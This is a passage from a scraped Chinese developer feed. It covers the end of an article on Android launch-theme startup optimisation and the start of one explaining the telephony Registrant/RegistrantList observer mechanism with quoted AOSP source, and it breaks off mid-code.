    <span class="hljs-tag">&lt;<span class="hljs-name">item</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"android:windowFullscreen"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">item</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"android:windowDrawsSystemBarBackgrounds"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">item</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"android:windowTranslucentStatus"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>

<span class="hljs-comment">&lt;!-- launch_screen.xml --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">layer-list</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">item</span> <span class="hljs-attr">android:drawable</span>=<span class="hljs-string">"@color/primaryDark"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">item</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">bitmap</span>
            <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span>
            <span class="hljs-attr">android:src</span>=<span class="hljs-string">"@mipmap/ic_launcher"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">layer-list</span>&gt;</span>
</code></pre>
<h4 data-id="heading-33"><strong>2. åœ¨ Manifest ä¸­åº”ç”¨</strong></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">application</span>
    <span class="hljs-attr">android:name</span>=<span class="hljs-string">".MyApplication"</span>
    <span class="hljs-attr">android:theme</span>=<span class="hljs-string">"@style/AppTheme.Launcher"</span>&gt;</span>
    
    <span class="hljs-tag">&lt;<span class="hljs-name">activity</span>
        <span class="hljs-attr">android:name</span>=<span class="hljs-string">".MainActivity"</span>
        <span class="hljs-attr">android:theme</span>=<span class="hljs-string">"@style/AppTheme"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.intent.action.MAIN"</span>/&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.intent.category.LAUNCHER"</span>/&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span>
    
<span class="hljs-tag">&lt;/<span class="hljs-name">application</span>&gt;</span>
</code></pre>
<h4 data-id="heading-34"><strong>3. åœ¨ Activity ä¸­åˆ‡æ¢ä¸»é¢˜</strong></h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">AppCompatActivity</span>() {
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
        <span class="hljs-comment">// åœ¨super.onCreateä¹‹å‰è®¾ç½®æ­£å¸¸ä¸»é¢˜</span>
        setTheme(R.style.AppTheme)
        
        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)
        
        <span class="hljs-comment">// ç›‘å¬ç¬¬ä¸€å¸§ç»˜åˆ¶å®Œæˆ</span>
        <span class="hljs-keyword">val</span> content = findViewById&lt;View&gt;(android.R.id.content)
        content.viewTreeObserver.addOnPreDrawListener(
            <span class="hljs-keyword">object</span> : ViewTreeObserver.OnPreDrawListener {
                <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onPreDraw</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
                    <span class="hljs-comment">// ç¬¬ä¸€å¸§å‡†å¤‡ç»˜åˆ¶æ—¶ï¼Œç§»é™¤å¯åŠ¨ä¸»é¢˜</span>
                    content.viewTreeObserver.removeOnPreDrawListener(<span class="hljs-keyword">this</span>)
                    
                    <span class="hljs-comment">// å¯ä»¥åœ¨è¿™é‡Œæ‰§è¡Œä¸€äº›åŠ¨ç”»</span>
                    startContentAnimation()
                    
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
                }
            }
        )
    }
}
</code></pre>
<p><strong>æ€»ç»“</strong>ï¼š</p>
<p>Android App å¯åŠ¨æµç¨‹æ ¸å¿ƒè¦ç‚¹ï¼š</p>
<ol>
<li>
<p><strong>è¿›ç¨‹åˆ›å»ºé˜¶æ®µ</strong>ï¼š</p>
<ul>
<li>Zygote fork æ–°è¿›ç¨‹</li>
<li>è°ƒç”¨ ActivityThread.main()</li>
<li>ç»‘å®šåˆ° AMS</li>
</ul>
</li>
<li>
<p><strong>Application åˆå§‹åŒ–</strong>ï¼š</p>
<ul>
<li>åˆ›å»º Application å®ä¾‹</li>
<li>è°ƒç”¨ Application.onCreate()</li>
<li>ContentProvider åˆå§‹åŒ–</li>
</ul>
</li>
<li>
<p><strong>Activity å¯åŠ¨</strong>ï¼š</p>
<ul>
<li>åˆ›å»º Activity å®ä¾‹</li>
<li>è°ƒç”¨ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ï¼ˆonCreate â†’ onStart â†’ onResumeï¼‰</li>
<li>Window å’Œ View åˆ›å»º</li>
</ul>
</li>
<li>
<p><strong>ç•Œé¢æ¸²æŸ“</strong>ï¼š</p>
<ul>
<li>ViewRootImpl åˆ›å»º</li>
<li>æ‰§è¡Œ measureã€layoutã€draw</li>
<li>é€šè¿‡ Choreographer åŒæ­¥åˆ°å±å¹•</li>
</ul>
</li>
<li>
<p><strong>ä¼˜åŒ–ç­–ç•¥</strong>ï¼š</p>
<ul>
<li>å»¶è¿Ÿåˆå§‹åŒ–</li>
<li>å¼‚æ­¥åŠ è½½</li>
<li>å¸ƒå±€ä¼˜åŒ–</li>
<li>å¯åŠ¨ä¸»é¢˜ä¼˜åŒ–</li>
<li>ä½¿ç”¨å¯åŠ¨å™¨æ¨¡å¼</li>
</ul>
</li>
<li>
<p><strong>æ€§èƒ½æµ‹é‡</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨ ADB å‘½ä»¤</li>
<li>ä»£ç åŸ‹ç‚¹</li>
<li>systrace åˆ†æ</li>
</ul>
</li>
</ol>
<p>ç†è§£å®Œæ•´çš„å¯åŠ¨æµç¨‹æœ‰åŠ©äºï¼š</p>
<ul>
<li>ä¼˜åŒ–åº”ç”¨å¯åŠ¨æ€§èƒ½</li>
<li>è§£å†³å¯åŠ¨ç™½å±/é»‘å±é—®é¢˜</li>
<li>è®¾è®¡åˆç†çš„åˆå§‹åŒ–ç­–ç•¥</li>
<li>æå‡ç”¨æˆ·ä½“éªŒ</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[telephonyçš„ç›‘å¬æ³¨å†Œæœºåˆ¶]]></title>    <link>https://juejin.cn/post/7602464510608441370</link>    <guid>https://juejin.cn/post/7602464510608441370</guid>    <pubDate>2026-02-04T02:37:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602464510608441370" data-draft-id="7602471311509880859" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="telephonyçš„ç›‘å¬æ³¨å†Œæœºåˆ¶"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-02-04T02:37:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·341408199125"/> <meta itemprop="url" content="https://juejin.cn/user/570004686782272"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            telephonyçš„ç›‘å¬æ³¨å†Œæœºåˆ¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/570004686782272/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·341408199125
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T02:37:08.000Z" title="Wed Feb 04 2026 02:37:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>ä¸¤å±‚æ¶æ„</strong>:</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">-</span>   å†…éƒ¨Â <span class="hljs-code">`RegistrantList`</span>Â ç”¨äºæ¡†æ¶å†…å¿«é€ŸåŒæ­¥é€šçŸ¥
<span class="hljs-bullet">-</span>   å¤–éƒ¨Â <span class="hljs-code">`TelephonyRegistry`</span>Â ç”¨äºåº”ç”¨å±‚è·¨è¿›ç¨‹å¼‚æ­¥é€šçŸ¥
</code></pre>
<h2 data-id="heading-0"><strong>Android Telephony ç›‘å¬æ³¨å†Œæœºåˆ¶è¯¦è§£</strong></h2>
<p>Android Telephony æ¡†æ¶ä½¿ç”¨äº†ä¸€å¥—ä¼˜é›…ä¸”é«˜æ•ˆçš„<strong>è§‚å¯Ÿè€…æ¨¡å¼</strong>å®ç°,é€šè¿‡ <code>Registrant</code> å’Œ <code>RegistrantList</code> æä¾›äº†å¼ºå¤§çš„äº‹ä»¶é€šçŸ¥æœºåˆ¶ã€‚è¿™æ˜¯æ•´ä¸ªç”µä¿¡æ¡†æ¶å†…éƒ¨é€šä¿¡çš„åŸºçŸ³ã€‚</p>
<hr/>
<h3 data-id="heading-1"><strong>ä¸€ã€æ ¸å¿ƒç±»è®¾è®¡</strong></h3>
<h4 data-id="heading-2"><strong>1. Registrant (å•ä¸ªæ³¨å†Œè€…)</strong></h4>
<pre><code class="hljs language-24:126:frameworks_base/core/java/android/os/Registrant.java" lang="24:126:frameworks_base/core/java/android/os/Registrant.java">public class Registrant
{
    @UnsupportedAppUsage
    public
    Registrant(Handler h, int what, Object obj)
    {
        refH = new WeakReference(h);
        this.what = what;
        userObj = obj;
    }

    @UnsupportedAppUsage
    public void
    clear()
    {
        refH = null;
        userObj = null;
    }

    @UnsupportedAppUsage
    public void
    notifyRegistrant()
    {
        internalNotifyRegistrant (null, null);
    }

    @UnsupportedAppUsage
    public void
    notifyResult(Object result)
    {
        internalNotifyRegistrant (result, null);
    }

    public void
    notifyException(Throwable exception)
    {
        internalNotifyRegistrant (null, exception);
    }

    /**
     * This makes a copy of @param ar
     */
    @UnsupportedAppUsage
    public void
    notifyRegistrant(AsyncResult ar)
    {
        internalNotifyRegistrant (ar.result, ar.exception);
    }

    /*package*/ void
    internalNotifyRegistrant (Object result, Throwable exception)
    {
        Handler h = getHandler();

        if (h == null) {
            clear();
        } else {
            Message msg = Message.obtain();

            msg.what = what;
            msg.obj = new AsyncResult(userObj, result, exception);
            h.sendMessage(msg);
        }
    }

    /**
     * NOTE: May return null if weak reference has been collected
     */

    @UnsupportedAppUsage
    public Message
    messageForRegistrant()
    {
        Handler h = getHandler();

        if (h == null) {
            clear();

            return null;
        } else {
            Message msg = h.obtainMessage();

            msg.what = what;
            msg.obj = userObj;

            return msg;
        }
    }

    @UnsupportedAppUsage(maxTargetSdk = Build.VERSION_CODES.P)
    public Handler
    getHandler()
    {
        if (refH == null)
            return null;

        return (Handler) refH.get();
    }

    WeakReference   refH;
    int             what;
    Object          userObj;
}
</code></pre>
<p><strong>å…³é”®ç‰¹æ€§</strong>:</p>
<ol>
<li>
<p><strong>å¼±å¼•ç”¨ Handler</strong></p>
<pre><code class="hljs language-java" lang="java">WeakReference refH;
</code></pre>
<ul>
<li>é¿å…å†…å­˜æ³„æ¼</li>
<li>å¦‚æœ Handler æ‰€å±çš„å¯¹è±¡è¢«å›æ”¶,è‡ªåŠ¨å¤±æ•ˆ</li>
</ul>
</li>
<li>
<p><strong>ä¸‰è¦ç´ </strong>:</p>
<ul>
<li><code>refH</code>: Handler çš„å¼±å¼•ç”¨</li>
<li><code>what</code>: æ¶ˆæ¯ç±»å‹ç (Message.what)</li>
<li><code>userObj</code>: ç”¨æˆ·è‡ªå®šä¹‰å¯¹è±¡</li>
</ul>
</li>
<li>
<p><strong>é€šçŸ¥æœºåˆ¶</strong>:</p>
<pre><code class="hljs language-java" lang="java">msg.what = what;
msg.obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AsyncResult</span>(userObj, result, exception);
h.sendMessage(msg);
</code></pre>
<ul>
<li>æ„é€  <code>Message</code>,å°è£… <code>AsyncResult</code></li>
<li>é€šè¿‡ Handler å‘é€åˆ°ç›®æ ‡çº¿ç¨‹</li>
</ul>
</li>
</ol>
<h4 data-id="heading-3"><strong>2. RegistrantList (æ³¨å†Œè€…åˆ—è¡¨)</strong></h4>
<pre><code class="hljs language-24:144:frameworks_base/core/java/android/os/RegistrantList.java" lang="24:144:frameworks_base/core/java/android/os/RegistrantList.java">public class RegistrantList
{
    ArrayList   registrants = new ArrayList();      // of Registrant

    @UnsupportedAppUsage
    public RegistrantList() {
    }

    @UnsupportedAppUsage
    public synchronized void
    add(Handler h, int what, Object obj)
    {
        add(new Registrant(h, what, obj));
    }

    @UnsupportedAppUsage
    public synchronized void
    addUnique(Handler h, int what, Object obj)
    {
        // if the handler is already in the registrant list, remove it
        remove(h);
        add(new Registrant(h, what, obj));
    }

    @UnsupportedAppUsage
    public synchronized void
    add(Registrant r)
    {
        removeCleared();
        registrants.add(r);
    }

    @UnsupportedAppUsage
    public synchronized void
    removeCleared()
    {
        for (int i = registrants.size() - 1; i &gt;= 0 ; i--) {
            Registrant  r = (Registrant) registrants.get(i);

            if (r.refH == null) {
                registrants.remove(i);
            }
        }
    }

    public synchronized void removeAll() {
        registrants.clear();
    }

    @UnsupportedAppUsage
    public synchronized int
    size()
    {
        return registrants.size();
    }

    @UnsupportedAppUsage(maxTargetSdk = Build.VERSION_CODES.P)
    public synchronized Object
    get(int index)
    {
        return registrants.get(index);
    }

    private synchronized void
    internalNotifyRegistrants (Object result, Throwable exception)
    {
       for (int i = 0, s = registrants.size(); i &lt; s ; i++) {
            Registrant  r = (Registrant) registrants.get(i);
            r.internalNotifyRegistrant(result, exception);
       }
    }

    @UnsupportedAppUsage
    public /*synchronized*/ void
    notifyRegistrants()
    {
        internalNotifyRegistrants(null, null);
    }

    public /*synchronized*/ void
    notifyException(Throwable exception)
    {
        internalNotifyRegistrants (null, exception);
    }

    @UnsupportedAppUsage
    public /*synchronized*/ void
    notifyResult(Object result)
    {
        internalNotifyRegistrants (result, null);
    }


    @UnsupportedAppUsage
    public /*synchronized*/ void
    notifyRegistrants(AsyncResult ar)
    {
        internalNotifyRegistrants(ar.result, ar.exception);
    }

    @UnsupportedAppUsage
    public synchronized void
    remove(Handler h)
    {
        for (int i = 0, s = registrants.size() ; i &lt; s ; i++) {
            Registrant  r = (Registrant) registrants.get(i);
            Handler     rh;

            rh = r.getHandler();

            /* Clean up both the requested registrant and
             * any now-collected registrants
             */
            if (rh == null || rh == h) {
                r.clear();
            }
        }

        removeCleared();
    }
}
</code></pre>
<p><strong>å…³é”®æ–¹æ³•</strong>:</p>
<ol>
<li>
<p><strong>add()</strong> vs <strong>addUnique()</strong></p>
<ul>
<li><code>add()</code>: å…è®¸åŒä¸€ Handler å¤šæ¬¡æ³¨å†Œ</li>
<li><code>addUnique()</code>: å…ˆç§»é™¤å·²å­˜åœ¨çš„,ç¡®ä¿å”¯ä¸€æ€§</li>
</ul>
</li>
<li>
<p><strong>removeCleared()</strong></p>
<ul>
<li>æ¸…ç†å·²å¤±æ•ˆçš„ Registrant (WeakReference è¢«å›æ”¶)</li>
<li>è‡ªåŠ¨åƒåœ¾æ¸…ç†æœºåˆ¶</li>
</ul>
</li>
<li>
<p><strong>notifyRegistrants()</strong></p>
<ul>
<li>éå†æ‰€æœ‰æ³¨å†Œè€…</li>
<li>é€ä¸ªé€šçŸ¥</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-4"><strong>äºŒã€å…¸å‹ä½¿ç”¨æ¨¡å¼</strong></h3>
<h4 data-id="heading-5"><strong>1. å£°æ˜ RegistrantList</strong></h4>
<pre><code class="hljs language-424:462:frameworks_opt_telephony/src/java/com/android/internal/telephony/Phone.java" lang="424:462:frameworks_opt_telephony/src/java/com/android/internal/telephony/Phone.java">    protected final RegistrantList mPreciseCallStateRegistrants = new RegistrantList();

    private final RegistrantList mHandoverRegistrants = new RegistrantList();

    private final RegistrantList mNewRingingConnectionRegistrants = new RegistrantList();

    private final RegistrantList mIncomingRingRegistrants = new RegistrantList();

    protected final RegistrantList mDisconnectRegistrants = new RegistrantList();

    private final RegistrantList mServiceStateRegistrants = new RegistrantList();

    protected final RegistrantList mMmiCompleteRegistrants = new RegistrantList();

    @UnsupportedAppUsage
    protected final RegistrantList mMmiRegistrants = new RegistrantList();

    protected final RegistrantList mUnknownConnectionRegistrants = new RegistrantList();

    protected final RegistrantList mSuppServiceFailedRegistrants = new RegistrantList();

    protected final RegistrantList mRadioOffOrNotAvailableRegistrants = new RegistrantList();

    protected final RegistrantList mSimRecordsLoadedRegistrants = new RegistrantList();

    private final RegistrantList mVideoCapabilityChangedRegistrants = new RegistrantList();

    protected final RegistrantList mEmergencyCallToggledRegistrants = new RegistrantList();

    private final RegistrantList mCellInfoRegistrants = new RegistrantList();

    private final RegistrantList mRedialRegistrants = new RegistrantList();

    private final RegistrantList mPhysicalChannelConfigRegistrants = new RegistrantList();

    private final RegistrantList mOtaspRegistrants = new RegistrantList();

    private final RegistrantList mPreferredNetworkTypeRegistrants = new RegistrantList();
</code></pre>
<p><strong>Phone ç±»ä¸­çš„å…¸å‹ RegistrantList</strong>:</p>
<ul>
<li>æœåŠ¡çŠ¶æ€å˜åŒ–</li>
<li>æ¥ç”µé€šçŸ¥</li>
<li>è¿æ¥æ–­å¼€</li>
<li>MMI å‘½ä»¤</li>
<li>ä¿¡å·å¼ºåº¦</li>
<li>å°åŒºä¿¡æ¯</li>
<li>...</li>
</ul>
<h4 data-id="heading-6"><strong>2. æ³¨å†Œæ¥å£</strong></h4>
<pre><code class="hljs language-1005:1033:frameworks_opt_telephony/src/java/com/android/internal/telephony/ServiceStateTracker.java" lang="1005:1033:frameworks_opt_telephony/src/java/com/android/internal/telephony/ServiceStateTracker.java">    public void registerForVoiceRoamingOn(Handler h, int what, Object obj) {
        Registrant r = new Registrant(h, what, obj);
        mVoiceRoamingOnRegistrants.add(r);

        if (mSS.getVoiceRoaming()) {
            r.notifyRegistrant();
        }
    }

    public void unregisterForVoiceRoamingOn(Handler h) {
        mVoiceRoamingOnRegistrants.remove(h);
    }

    /**
     * Registration point for roaming off of mobile voice
     * combined roaming is true when roaming is true and ONS differs SPN
     *
     * @param h handler to notify
     * @param what what code of message when delivered
     * @param obj placed in Message.obj
     */
    public void registerForVoiceRoamingOff(Handler h, int what, Object obj) {
        Registrant r = new Registrant(h, what, obj);
        mVoiceRoamingOffRegistrants.add(r);

        if (!mSS.getVoiceRoaming()) {
            r.notifyRegistrant();
        }
    }
</code></pre>
<p><strong>æ ‡å‡†æ¨¡å¼</strong>:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerForXxxChanged</span><span class="hljs-params">(Handler h, <span class="hljs-type">int</span> what, Object obj)</span> {
    <span class="hljs-type">Registrant</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Registrant</span>(h, what, obj);
    mXxxRegistrants.add(r);
    
    <span class="hljs-comment">// ç«‹å³é€šçŸ¥å½“å‰çŠ¶æ€(å¯é€‰)</span>
    <span class="hljs-keyword">if</span> (currentStateæ»¡è¶³æ¡ä»¶) {
        r.notifyRegistrant();
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unregisterForXxxChanged</span><span class="hljs-params">(Handler h)</span> {
    mXxxRegistrants.remove(h);
}
</code></pre>
<h4 data-id="heading-7"><strong>3. è§¦å‘é€šçŸ¥</strong></h4>
<pre><code class="hljs language-4704:4709:frameworks_opt_telephony/src/java/com/android/internal/telephony/ServiceStateTracker.java" lang="4704:4709:frameworks_opt_telephony/src/java/com/android/internal/telephony/ServiceStateTracker.java">    private void notifyCdmaSubscriptionInfoReady() {
        if (mCdmaForSubscriptionInfoReadyRegistrants != null) {
            if (DBG) log("CDMA_SUBSCRIPTION: call notifyRegistrants()");
            mCdmaForSubscriptionInfoReadyRegistrants.notifyRegistrants();
        }
    }
</code></pre>
<p><strong>é€šçŸ¥æ–¹å¼</strong>:</p>
<ol>
<li>
<p><strong>æ— å‚æ•°é€šçŸ¥</strong>:</p>
<pre><code class="hljs language-java" lang="java">mRegistrants.notifyRegistrants();
</code></pre>
</li>
<li>
<p><strong>æºå¸¦ç»“æœ</strong>:</p>
<pre><code class="hljs language-java" lang="java">mRegistrants.notifyResult(result);
</code></pre>
</li>
<li>
<p><strong>æºå¸¦ AsyncResult</strong>:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">AsyncResult</span> <span class="hljs-variable">ar</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AsyncResult</span>(<span class="hljs-literal">null</span>, result, exception);
mRegistrants.notifyRegistrants(ar);
</code></pre>
</li>
</ol>
<hr/>
<h3 data-id="heading-8"><strong>ä¸‰ã€å®Œæ•´ç¤ºä¾‹:ç½‘ç»œé©»ç½‘çŠ¶æ€ç›‘å¬</strong></h3>
<h4 data-id="heading-9"><strong>1. å®šä¹‰ RegistrantList (ServiceStateTracker)</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">RegistrantList</span> <span class="hljs-variable">mNetworkAttachedRegistrants</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegistrantList</span>();
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">RegistrantList</span> <span class="hljs-variable">mNetworkDetachedRegistrants</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegistrantList</span>();
</code></pre>
<h4 data-id="heading-10"><strong>2. æä¾›æ³¨å†Œæ¥å£</strong></h4>
<pre><code class="hljs language-4864:4894:frameworks_opt_telephony/src/java/com/android/internal/telephony/ServiceStateTracker.java" lang="4864:4894:frameworks_opt_telephony/src/java/com/android/internal/telephony/ServiceStateTracker.java">    public void registerForNetworkAttached(Handler h, int what, Object obj) {
        Registrant r = new Registrant(h, what, obj);

        mNetworkAttachedRegistrants.add(r);
        if (mSS.getState() == ServiceState.STATE_IN_SERVICE) {
            r.notifyRegistrant();
        }
    }

    public void unregisterForNetworkAttached(Handler h) {
        mNetworkAttachedRegistrants.remove(h);
    }

    /**
     * Registration point for transition into network detached.
     * @param h handler to notify
     * @param what what code of message when delivered
     * @param obj in Message.obj
     */
    public void registerForNetworkDetached(Handler h, int what, Object obj) {
        Registrant r = new Registrant(h, what, obj);

        mNetworkDetachedRegistrants.add(r);
        if (mSS.getState() != ServiceState.STATE_IN_SERVICE) {
            r.notifyRegistrant();
        }
    }

    public void unregisterForNetworkDetached(Handler h) {
